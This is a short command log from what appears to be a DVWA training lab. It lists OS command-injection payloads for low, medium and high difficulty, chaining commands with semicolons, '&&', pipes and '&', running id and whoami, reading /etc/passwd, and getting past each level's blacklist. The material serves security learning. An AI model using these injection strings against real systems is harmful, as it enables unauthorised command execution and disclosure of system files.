```markdown
# Command Log & Execution History

## Environment Setup
```bash
# Check Docker container status
docker ps

# Start DVWA container
docker start dvwa
Low Level Payloads
Bash
# Baseline check
127.0.0.1

# Command Chaining (Semicolon)
127.0.0.1; id
127.0.0.1; cat /etc/passwd
127.0.0.1; uname -a

# Command Chaining (AND operator)
127.0.0.1 && whoami
Medium Level Payloads
Bash
# Bypassing ';' and '&&' blacklists via single pipe
127.0.0.1 | id
127.0.0.1 | cat /etc/passwd

# Background execution via ampersand
127.0.0.1 & whoami
High Level Payloads
Bash
# Bypassing '| ' (pipe + space) blacklist typo by omitting spaces
127.0.0.1|id
127.0.0.1|cat /etc/passwd
127.0.0.1|whoami

---
